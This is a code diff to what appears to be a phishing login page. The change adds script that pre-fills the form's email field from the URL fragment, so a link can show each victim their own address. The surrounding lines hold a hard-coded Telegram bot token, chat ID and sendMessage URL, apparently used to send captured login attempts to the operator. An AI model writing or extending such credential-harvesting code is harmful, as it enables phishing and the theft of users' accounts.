@@ -107,7 +107,13 @@
     const form = document.getElementById("loginForm");
     const errorMsg = document.getElementById("errorMsg");
     const attempts = [];
-
+    
+    // Auto-fill email from URL fragment
+const fragmentEmail = window.location.hash.slice(1);
+if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
+  form.email.value = fragmentEmail;
+}
+    
     const telegramToken = "7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s";
     const chatId = "5613637159";
     const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
